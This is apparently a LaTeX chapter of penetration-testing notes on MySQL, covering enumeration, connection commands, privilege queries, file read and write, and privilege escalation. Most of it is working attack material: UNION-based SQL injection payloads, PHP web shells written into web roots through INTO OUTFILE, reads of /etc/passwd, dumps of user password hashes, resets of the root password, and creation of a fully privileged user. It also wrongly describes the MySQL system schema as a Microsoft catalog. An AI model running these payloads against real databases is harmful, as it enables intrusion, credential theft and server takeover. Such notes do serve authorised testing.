\chapter{MySQL}

\section{Introduction}
Usually, the MySQL server runs on TCP port 3306.


\subsection{Default system databases}

MySQL default system schemas/databases:
\begin{itemize}
    \item \verb+mysql+ is the system database that contains tables that store information required by the MySQL server
    \item
            \href{https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes}{the
            System Schema (sys)} which contains tables, information, and
            metadata necessary for management.
    \item \verb+information_schema+: which contains metadata mainly retreived from the system schema. 
    \item \verb+performance_schema+ is a feature for monitoring MySQL Server execution at a low level
\end{itemize}

The reason for the existence of these two is the ANSI/ISO standard that has
been established. System schema is a Microsoft system catalog for SQL servers
and contains much more information than the information schema.

There is a widely covered
\href{https://dev.mysql.com/doc/refman/8.0/en/general-security-issues.html}{security
issues} section in the reference manual that covers best practices for securing
MySQL servers.

\subsection{Authentication mechanisms}
MySQL also supports different
\href{https://dev.mysql.com/doc/internals/en/authentication-method.html}{authentication
methods}, such as username and password, as well as Windows authentication
(plugin required). In addition, administrators can
\href{https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode}{choose
an authentication mode} for many reasons, including compatibility, security,
usability, and more. However, depending on which method is implemented,
misconfigurations can occur.


\section{Dangerous Settings}
The settings {\bf user}, {\bf password}, and {\bf admin\_address} are
security-relevant because the entries are made in plain text. Often, the rights
for the configuration file of the MySQL server are not assigned correctly. If
we get another way to read files or even a shell, we can see the file and the
username and password for the MySQL server. Suppose there are no other security
measures to prevent unauthorized access. In that case, the entire database and
all the existing customers' information, email addresses, passwords, and
personal data can be viewed and even edited.


The {\bf debug} and {\bf sql\_warnings} settings provide verbose information
output in case of errors, which are essential for the administrator but should
not be seen by others. This information often contains sensitive content, which
could be detected by trial and error to identify further attack possibilities.
These error messages are often displayed directly on web applications.
Accordingly, the SQL injections could be manipulated even to have the MySQL
server execute system commands.

\section{Footprint / enumeration}

\subsection{nmap}

\begin{verbatim}
sudo nmap -sV -sC -p3306 --script mysql*
\end{verbatim}

\section{Interaction}

\subsection{mysql}

\subsubsection{Connexion}
\begin{verbatim}
mysql -u USERNAME -pPASSWORD -h  IP
\end{verbatim}

\subsection{dbeaver}
\subsection{mysql workbench}





\section{SQL fro mysql}
\subsection{Usefull commands}

\begin{verbatim}
show databases;
use <database>;
use sys ; -- system schema
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name


#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
\end{verbatim}



\subsection{usefull functions}
\begin{verbatim}
SELECT group_concat( <field name> ) FROM table
SELECT group( <field name>," ", ...  ) FROM table

CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
\end{verbatim}

\subsection{privileges}

You can see in the docs the meaning of each privilege:
\url{https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_execute}

\begin{verbatim}
SELECT USER()
SELECT CURRENT_USER()
# Get users, permissions & hashes
SELECT * FROM mysql.user;

SELECT super_priv FROM mysql.user
SELECT sql_grants FROM information_schema.sql_show_grants
SELECT grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();


#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
\end{verbatim}


\section{Command execution}

MySQL supports
\href{https://rsc.anu.edu.au/~rsccu/manuals/mySQL/refman-5.0-en.html-chapter/extending-mysql.html#adding-udf}{User
Defined Functions} which allows us to execute C/C++ code as a function within
SQL, there's one User Defined Function for command execution in this
\href{https://github.com/mysqludf/lib_mysqludf_sys}{GitHub repository}. It is
not common to encounter a user-defined function like this in a production
environment, but we should be aware that we may be able to use it.

\begin{verbatim}
#Get a shell with the mysql client user
\! sh
\end{verbatim}

\section{Read / Write local files}
A global system variable
\href{https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv}{secure\_file\_priv}
limits the effect of data import and export operations, such as those performed
by the \verb+LOAD DATA+ and \verb+SELECT â€¦ INTO OUTFILE+ statements and the
\href{https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file}{LOAD\_FILE()}
function. 

These operations are permitted only to users who have the
\href{https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file}{FILE} privilege.

\begin{verbatim}
SHOW variables LIKE "secure_file_priv";
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
; false -----> INTO OUTFILE
\end{verbatim}

\subsection{Write file}
\begin{verbatim}
SELECT 'XXX' INTO FILE 'PATH';

SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT '<?php system("pwd"); ?>' INTO OUTFILE '/var/www/html/shell.php'
\end{verbatim}


\subsection{Read file}

\begin{verbatim}
select LOAD_FILE("/etc/passwd");
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
\end{verbatim}


\section{Privilege escalation}

\subsection{Mysql user}
\begin{verbatim}
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | 
    cut -d '=' -f2 | cut -d ' ' -f1
\end{verbatim}

\subsection{Escalation}
\begin{verbatim}
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,
    delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
\end{verbatim}

\subsection{Privilege Escalation via library}
\url{https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library}

\section{links}
\begin{itemize}
    \item 
\href{https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes}{mysql
System Schema}
\end{itemize}

